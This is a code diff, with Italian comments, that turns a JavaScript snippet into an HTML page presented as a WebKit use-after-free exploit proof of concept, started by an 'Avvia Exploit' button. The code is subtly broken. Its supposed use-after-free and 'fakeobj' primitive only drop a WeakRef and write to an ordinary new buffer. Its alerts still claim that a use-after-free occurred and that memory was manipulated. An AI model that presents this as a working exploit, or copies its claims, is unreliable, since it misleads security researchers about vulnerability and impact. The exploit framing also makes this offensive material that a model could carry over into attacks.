@@ -1,30 +1,88 @@
-function triggerUAF() {
-    // Oggetto vulnerabile
-    let overlay = { initialized: false };
-    let weakRef = new WeakRef(overlay);
-
-    // Alloca un buffer controllato
-    let controlledBuffer = new ArrayBuffer(0x100);
-
-    setTimeout(() => {
-        // Forza la distruzione dell'oggetto
-        overlay = null;
-
-        // Garbage Collection
-        forceGC();
-
-        // Riutilizza memoria liberata
-        let fakeObj = fakeobj(controlledBuffer);
-        alert("Oggetto falsificato: " + fakeObj);
-
-        try {
-            // Lettura/scrittura da buffer controllato
-            let view = new DataView(fakeObj);
-            view.setUint32(0, 0x41414141); // Scrive valori controllati
-            let readValue = view.getUint32(0);
-            alert("Valore letto: " + readValue.toString(16));
-        } catch (e) {
-            alert("Errore durante l'exploit: " + e.message);
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebKit PoC Exploit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
         }
-    }, 100);
-}
+
+        button {
+            background-color: #007BFF; /* Colore blu */
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>WebKit Exploit PoC</h1>
+    <p>Questa pagina dimostra un Proof of Concept per una vulnerabilità UAF (Use-After-Free).</p>
+    <button id="startExploit" onclick="startExploit()">Avvia Exploit</button>
+
+    <script>
+        function forceGC() {
+            let bigArray = [];
+            for (let i = 0; i < 10000; i++) {
+                bigArray.push(new Uint8Array(1024 * 1024));
+            }
+            bigArray = null;
+            alert("Garbage Collection forzata.");
+        }
+
+        function fakeobj(addr) {
+            // Funzione che crea un oggetto falsificato
+            let buffer = new ArrayBuffer(8);
+            let view = new DataView(buffer);
+            view.setFloat64(0, addr, true);
+            return view;
+        }
+
+        function triggerUAF() {
+            let overlay = { key: 123 };
+            let weakRef = new WeakRef(overlay);
+
+            alert("Overlay creato.");
+            setTimeout(() => {
+                overlay = null; // Dereferenzia l'oggetto
+                forceGC(); // Forza il Garbage Collector
+
+                setTimeout(() => {
+                    try {
+                        let fakeAddress = weakRef.deref();
+                        if (!fakeAddress) {
+                            alert("Use-After-Free avvenuto! Tentativo di creare un oggetto falso.");
+                        } else {
+                            alert("Oggetto ancora valido: " + JSON.stringify(fakeAddress));
+                        }
+
+                        // Crea un fakeobj per manipolare la memoria
+                        let fakeObject = fakeobj(0x41414141);
+                        alert("Oggetto falsificato creato con successo.");
+                        
+                        // Test di lettura e scrittura
+                        fakeObject.setInt32(0, 0xDEADBEEF, true);
+                        let readValue = fakeObject.getInt32(0, true);
+                        alert("Valore letto dalla memoria: 0x" + readValue.toString(16));
+                    } catch (e) {
+                        alert("Errore rilevato: " + e.message);
+                    }
+                }, 100);
+            }, 100);
+        }
+
+        function startExploit() {
+            alert("Avvio exploit...");
+            triggerUAF();
+        }
+    </script>
+</body>
+</html>
